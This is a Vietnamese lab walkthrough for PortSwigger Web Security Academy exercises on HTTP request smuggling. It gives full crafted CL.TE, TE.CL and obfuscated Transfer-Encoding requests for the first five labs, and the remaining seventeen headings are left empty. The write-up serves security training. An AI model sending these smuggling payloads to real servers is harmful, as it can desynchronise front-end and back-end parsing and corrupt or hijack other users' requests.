# 1. HTTP request smuggling, basic CL.TE vulnerability
Để exploit HTTP request smuggling, ta cấu hình request sau:
```
POST / HTTP/1.1
Host: 0add002e0324d0fec01c8bee00ab0070.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
Do back-end server xác định điểm cuối của request bằng header `Transfer-Encoding`, nên ký tự `G` cuối cùng sẽ được hiểu là một phần của request tiếp theo. Khi đó, nếu ta gửi thêm một request POST, thì thực tế method của request đó sẽ là GPOST.

Submit request trên hai lần, kết quả bài lab được giải.

# 2. HTTP request smuggling, basic TE.CL vulnerability
Bài lab có front-end sử dụng TE và backend sử dụng CL, như vậy ta có thể exploit với request sau:
```
POST / HTTP/1.1
Host: 0a76006c036dbdfec4dac96100a90022.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

5a
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x
0


```
Front-end sử dụng TE nên sẽ lấy body request từ `5a` đến hết ký tự kết thúc `0`, còn back-end sử dụng CL `Content-Length: 4` nên sẽ xử lý body request chỉ có phần `5a`. Như vậy, từ `GPOST` trở đi sẽ được coi là request kế tiếp. Khi ta submit request hai lần, request đầu tiên sẽ là POST request với body `5a`, và request thứ hai sẽ là GPOST request. Như vậy, bài lab được giải thành công.

# 3. HTTP request smuggling, obfuscating the TE header
Website có front-end và back-end server đều sử dụng Transfer-Encoding, ta sẽ thử tìm cách để một trong hai server không xử lý Transfer-Encoding đúng cách.

Thử với request sau:
```
POST / HTTP/1.1
Host: 0a5600960437858ac0f3db4f0041006f.web-security-academy.net
Content-Length: 3
Transfer-Encoding: chunked
Transfer-Encoding: x

1
G
0


```
Ta thấy lỗi `Unrecognized method G0POST`, trường hợp này chỉ xảy ra với TE.CL. Như vậy, nếu có hai Transfer-Encoding thì back-end server sẽ lấy header Transfer-Encoding thứ 2(không hợp lệ) và do đó sử dụng Content-Length thay thế, dẫn đến từ TE.TE trở thành TE.CL.

Ta cấu hình đoạn request sau:
```
POST / HTTP/1.1
Host: 0a5600960437858ac0f3db4f0041006f.web-security-academy.net
Content-Length: 3
Transfer-Encoding: chunked
Transfer-Encoding: x

29
GPOST / HTTP/1.1
Content-Length: 15

x
0


```
Sau khi submit request hai lần, website trả về lỗi "Unrecognized method GPOST`. Như vậy, bài lab được giải thành công.

# 4. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
Để exploit lỗ hổng CL.TE, ta cấu hình request sau:
```
POST / HTTP/1.1
Host: 0aea0014046cafbbc16d670200f60046.web-security-academy.net
Content-Length: 37
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

1
x
0

GET /haha HTTP/1.1
Foo: x
```
Với front-end server sử dụng CL, request sẽ chứa toàn bộ thông tin ở trên. Với backend-server sử dụng TE, request sẽ gồm từ `POST...` đến hết ký tự `0` (do là dấu hiệu kết thúc chunked data). Như vậy, đoạn `GET /haha...` sẽ được xử lý như một phần của request kế tiếp. Nếu request sau đó trỏ đến home page, nó sẽ trở thành:
```
GET /haha HTTP/1.1
Foo: xGET / HTTP/1.1
Host: 0aea0014046cafbbc16d670200f60046.web-security-academy.net
...
```
Và kết quả, trả về 404 Not Found. Sau khi submit request, bài lab được giải thành công.

# 5. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
Để exploit lỗ hổng TE.CL, ta cấu hình đoạn request sau:
```
POST / HTTP/1.1
Host: 0a1000dc03cf46e8c17a0d0100bf009b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0


```
Với front-end sử dụng TE, toàn bộ request trên sẽ được process và chuyển về cho back-end. Do back-end sử dụng CL `Content-Length: 4`, body của request đầu tiên sẽ chỉ bao gồm `5c\r\n`, và từ `GET /404...` đến hết số `0` sẽ được coi là 1 phần của request tiếp theo. Như vậy, nếu request tiếp theo là `GET /` thì nó sẽ trở thành:
```
GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0GET / HTTP/1.1
Host: 0a1000dc03cf46e8c17a0d0100bf009b.web-security-academy.net
...
```
Và kết quả sẽ trả về 404: Not Found. Sau khi submit request, kết quả thành công.

# 6. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

# 7. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

# 8. Exploiting HTTP request smuggling to reveal front-end request rewriting

# 9. Exploiting HTTP request smuggling to capture other users' requests

# 10. Exploiting HTTP request smuggling to deliver reflected XSS

# 11. Response queue poisoning via H2.TE request smuggling

# 12. H2.CL request smuggling

# 13. HTTP/2 request smuggling via CRLF injection

# 14. HTTP/2 request splitting via CRLF injection

# 15. CL.0 request smuggling

# 16. Exploiting HTTP request smuggling to perform web cache poisoning

# 17. Exploiting HTTP request smuggling to perform web cache deception

# 18. Bypassing access controls via HTTP/2 request tunnelling

# 19. Web cache poisoning via HTTP/2 request tunnelling

# 20. Client-side desync

# 21. Browser cache poisoning via client-side desync

# 22. Server-side pause-based request smuggling
